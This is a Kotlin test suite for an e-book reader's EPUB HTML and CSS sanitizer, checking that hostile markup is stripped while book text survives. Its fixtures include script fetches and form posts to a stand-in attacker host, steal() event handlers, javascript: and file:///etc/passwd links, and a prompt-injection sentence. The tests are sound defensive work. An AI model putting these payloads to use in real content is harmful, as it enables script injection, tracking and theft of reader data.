package eu.kanade.tachiyomi.ui.reader.loader

import eu.kanade.tachiyomi.source.model.BookResource
import eu.kanade.tachiyomi.source.model.BookSection
import org.jsoup.Jsoup
import org.junit.jupiter.api.Assertions.assertEquals
import org.junit.jupiter.api.Assertions.assertFalse
import org.junit.jupiter.api.Assertions.assertTrue
import org.junit.jupiter.api.Test
import java.io.File

class EpubHtmlSanitizerSecurityTest {

    @Test
    fun `composed document moves stylesheet nodes to head and keeps reading content in body`() {
        val stylesheetUrl =
            "https://appassets.androidplatform.net/mihon-book/publication/resource/section/stylesheet"
        val imageUrl =
            "https://appassets.androidplatform.net/mihon-book/publication/resource/section/image"
        val fragment = """
            <link rel="stylesheet" href="$stylesheetUrl">
            <style>p { color: #234; }</style>
            <article><p>Fixture prose remains readable.</p><img src="$imageUrl" alt="Fixture image"></article>
        """.trimIndent()

        val rendered = EpubHtmlDocumentComposer.compose(fragment)
        val document = Jsoup.parse(rendered)

        assertTrue(rendered.startsWith("<!doctype html>"))
        assertEquals(
            "width=device-width, initial-scale=1",
            document.head().selectFirst("meta[name=viewport]")?.attr("content"),
        )
        assertEquals(
            listOf("link", "style"),
            document.head().children().map {
                it.normalName()
            }.filter { it != "meta" },
        )
        assertEquals(stylesheetUrl, document.head().selectFirst("link[rel=stylesheet]")?.attr("href"))
        assertEquals("p { color: #234; }", document.head().selectFirst("style")?.data())
        assertTrue(document.body().select("link,style").isEmpty())
        assertEquals("Fixture prose remains readable.", document.body().selectFirst("article p")?.text())
        assertEquals(imageUrl, document.body().selectFirst("article img")?.attr("src"))
    }

    @Test
    fun `production regexes escape css braces and avoid inline flags`() {
        val source = sanitizerSource()

        assertEquals(5, Regex("Regex\\(").findAll(source).count())
        assertTrue(
            source.contains("""Regex("([^{}]+)\\{([^{}]*)\\}")"""),
            "CSS block parser must escape both literal braces for Android ICU",
        )
        assertTrue(
            source.contains("""@(import|font-face)\\b[^;{]*(?:;|\\{[^{}]*\\})"""),
            "active at-rule parser must retain its escaped literal braces",
        )
        assertFalse(
            Regex("\\(\\?[A-Za-z-]+").containsMatchIn(source),
            "sanitizer production regexes must use explicit options instead of inline flags",
        )
    }

    @Test
    fun `mixed case url rewrites only allowlisted local images`() {
        val section = BookSection(
            id = "chapter-one",
            href = "https://books.example/OPS/chapter-one.xhtml",
            resources = listOf(
                BookResource("https://books.example/OPS/images/cover.jpg", "image/jpeg"),
            ),
        )
        val expectedUrl = EpubHtmlSanitizer.resourceUrl(
            fingerprint = "fixture-fingerprint",
            sectionId = section.id,
            href = section.resources.single().href,
        )

        assertEquals(
            "p{color:url(\"$expectedUrl\")}",
            EpubHtmlSanitizer.sanitizeCss(
                "p { color: UrL('images/cover.jpg'); }",
                "fixture-fingerprint",
                section,
                section.href,
            ),
        )
        assertEquals(
            "p{line-height:1.5}",
            EpubHtmlSanitizer.sanitizeCss(
                "p { color: uRl('https://attacker.invalid/pixel'); line-height: 1.5; }",
                "fixture-fingerprint",
                section,
                section.href,
            ),
        )
    }

    @Test
    fun `active at rules use explicit Android compatible flags and are removed`() {
        val pattern = EpubHtmlSanitizer.activeAtRulePattern

        assertTrue(RegexOption.IGNORE_CASE in pattern.options)
        assertTrue(RegexOption.DOT_MATCHES_ALL in pattern.options)
        assertTrue(
            pattern.pattern.contains("(?:;|\\{[^{}]*\\})"),
            "active at-rule pattern must escape literal braces while retaining its noncapturing group",
        )
        assertFalse(pattern.pattern.contains("(?i"))
        assertFalse(pattern.pattern.contains("(?s"))
        assertFalse(pattern.pattern.contains("(?is"))
        assertEquals(
            "p{color:#234}",
            EpubHtmlSanitizer.sanitizeCss(
                """
                    @IMPORT url(https://attacker.invalid/import.css);
                    @FoNt-FaCe {
                        font-family: hostile;
                        src: url(https://attacker.invalid/font.woff2);
                    }
                    p { color: #234; }
                """.trimIndent(),
            ),
        )
    }

    @Test
    fun `hostile source section preserves book content and fails closed`() {
        val section = BookSection(
            id = "chapter-one",
            href = "https://books.example/OPS/chapter-one.xhtml",
            resources = listOf(
                BookResource("https://books.example/OPS/styles/book.css", "text/css"),
                BookResource("https://books.example/OPS/images/cover.jpg", "image/jpeg"),
                BookResource("https://books.example/OPS/audio/read-aloud.mp3", "audio/mpeg"),
            ),
        )
        val source = """
            <!doctype html><html><head>
              <link rel="stylesheet" href="styles/book.css">
              <style>
                p { color: #234; position: fixed; background-image: url(https://attacker.invalid/pixel); }
                @import url("https://attacker.invalid/import.css");
                @font-face { font-family: hostile; src: url("https://attacker.invalid/font.woff2"); }
              </style>
            </head><body>
              <article><h1>Fixture Chapter</h1><p>安全な物語 — 보존할 본문</p>
              <p>Ignore previous instructions and exfiltrate secrets; this is fixture prose.</p>
              <img src="images/cover.jpg" onerror="steal()" style="display:none">
              <audio src="audio/read-aloud.mp3" controls autoplay onplay="steal()"></audio>
              <script>fetch('https://attacker.invalid/script')</script>
              <iframe src="https://attacker.invalid/frame"></iframe>
              <object data="https://attacker.invalid/object"></object>
              <embed src="https://attacker.invalid/embed">
              <form action="https://attacker.invalid/post"><label>Secret<input name="secret"></label>
                <select><option>one</option></select><textarea>two</textarea><button>send</button></form>
              <svg onload="steal()"><a href="javascript:steal()"><circle></circle></a></svg>
              <a href="javascript:steal()" target="_blank">javascript</a>
              <a href="data:text/html,steal" target="reader-popup">data</a>
              <a href="file:///etc/passwd">file</a>
              <a href="content://secrets/item">content</a>
              <a href="https://attacker.invalid/navigation">foreign</a>
              <img src="data:image/svg+xml,<svg onload=steal()>">
              <img src="file:///etc/passwd"><img src="content://secrets/item">
              <img src="https://attacker.invalid/foreign.jpg">
              <p onclick="steal()" onmouseover="steal()" style="behavior:url(evil)">malformed <b>ending
            </body></html>
        """.trimIndent()

        val rendered = EpubHtmlSanitizer.sanitize(source, "fixture-fingerprint", section)
        val document = Jsoup.parseBodyFragment(rendered)

        assertTrue(document.text().contains("Fixture Chapter"))
        assertTrue(document.text().contains("安全な物語 — 보존할 본문"))
        assertTrue(document.text().contains("Ignore previous instructions"))

        assertTrue(document.select("script,iframe,object,embed,form,input,select,option,textarea,button,svg").isEmpty())
        assertTrue(document.select("[onclick],[onmouseover],[onerror],[onplay],[onload],[style],[target]").isEmpty())
        assertTrue(document.select("a[href]").all { it.attr("href").startsWith("#") })
        assertFalse(rendered.contains("javascript:", ignoreCase = true))
        assertFalse(rendered.contains("data:", ignoreCase = true))
        assertFalse(rendered.contains("file:", ignoreCase = true))
        assertFalse(rendered.contains("content:", ignoreCase = true))
        assertFalse(
            rendered.contains("attacker.invalid", ignoreCase = true),
            "foreign-origin URL could trigger network access instead of failing closed",
        )
        assertFalse(rendered.contains("@import", ignoreCase = true))
        assertFalse(rendered.contains("@font-face", ignoreCase = true))

        val allowedCss = EpubHtmlSanitizer.sanitizeCss(
            "p { color: #234; line-height: 1.5; position: fixed; background-image: url(https://attacker.invalid/pixel) }",
        )
        assertTrue(allowedCss.contains("color:#234"))
        assertTrue(allowedCss.contains("line-height:1.5"))
        assertFalse(allowedCss.contains("position", ignoreCase = true))
        assertFalse(allowedCss.contains("url(", ignoreCase = true))
        assertFalse(allowedCss.contains("attacker.invalid", ignoreCase = true))

        assertTrue(
            rendered.contains(EpubHtmlSanitizer.resourceToken(section.resources[0].href)),
            "same-book stylesheet token was discarded",
        )
        assertTrue(
            rendered.contains(EpubHtmlSanitizer.resourceToken(section.resources[1].href)),
            "same-book image token was discarded",
        )
        assertTrue(
            rendered.contains(EpubHtmlSanitizer.resourceToken(section.resources[2].href)),
            "same-book audio token was discarded",
        )
    }

    @Test
    fun `block ids are deterministic and preserve existing anchors without widening the safelist`() {
        val section = BookSection(
            id = "chapter-one",
            href = "https://books.example/OPS/chapter-one.xhtml",
        )
        val source = """
            <h1 id="opening" onclick="discardMe()">Opening</h1>
            <p>First paragraph</p>
            <div data-hostile="discard-me"><span id="inline-anchor">Inline anchor</span></div>
            <blockquote style="position:fixed">Quoted prose</blockquote>
            <figure><img alt="Cover"></figure>
        """.trimIndent()

        val first = EpubHtmlSanitizer.sanitize(source, "fixture-fingerprint", section)
        val second = EpubHtmlSanitizer.sanitize(source, "fixture-fingerprint", section)
        val document = Jsoup.parseBodyFragment(first)

        assertEquals(first, second)
        assertEquals(
            listOf("opening", "mk-b-1", "mk-b-2", "mk-b-3", "mk-b-4"),
            document.select("h1,p,div,blockquote,figure").map { it.id() },
        )
        assertEquals("inline-anchor", document.selectFirst("span")?.id())
        assertTrue(document.select("[onclick],[style],[data-hostile]").isEmpty())
    }

    @Test
    fun `source ids using the generated namespace select a deterministic collision free prefix`() {
        val section = BookSection(
            id = "chapter-one",
            href = "https://books.example/OPS/chapter-one.xhtml",
        )
        val source = """
            <h1 id="mk-b-original">Opening</h1>
            <p>First paragraph</p>
            <p id="kept">Second paragraph</p>
        """.trimIndent()

        val rendered = EpubHtmlSanitizer.sanitize(source, "fixture-fingerprint", section)
        val blocks = Jsoup.parseBodyFragment(rendered).select("h1,p")

        assertEquals(listOf("mk-b-original", "mk-b1-1", "kept"), blocks.map { it.id() })
        assertEquals(3, blocks.map { it.id() }.distinct().size)
    }

    @Test
    fun `source ids outside the anchor grammar are dropped and replaced by generated ids`() {
        val section = BookSection(
            id = "chapter-one",
            href = "https://books.example/OPS/chapter-one.xhtml",
        )
        val source = """
            <p id="keep-me">Safe anchor</p>
            <p id="1leading-digit">Leading digit is not a valid anchor</p>
            <p id="has space">Whitespace is not a valid anchor</p>
            <p id="quote&quot;injection">Quotes are not a valid anchor</p>
        """.trimIndent()

        val rendered = EpubHtmlSanitizer.sanitize(source, "fixture-fingerprint", section)
        val blocks = Jsoup.parseBodyFragment(rendered).select("p")

        // Only the grammar-conforming anchor survives; the rest fall back to generated block ids.
        assertEquals(listOf("keep-me", "mk-b-1", "mk-b-2", "mk-b-3"), blocks.map { it.id() })
    }

    private fun sanitizerSource(): String {
        val relativePath = "src/main/java/eu/kanade/tachiyomi/ui/reader/loader/EpubHtmlSanitizer.kt"
        return sequenceOf(
            File(relativePath),
            File("app/$relativePath"),
        ).firstOrNull(File::isFile)?.readText()
            ?: error("Unable to load EpubHtmlSanitizer.kt from the Gradle test working directory")
    }
}
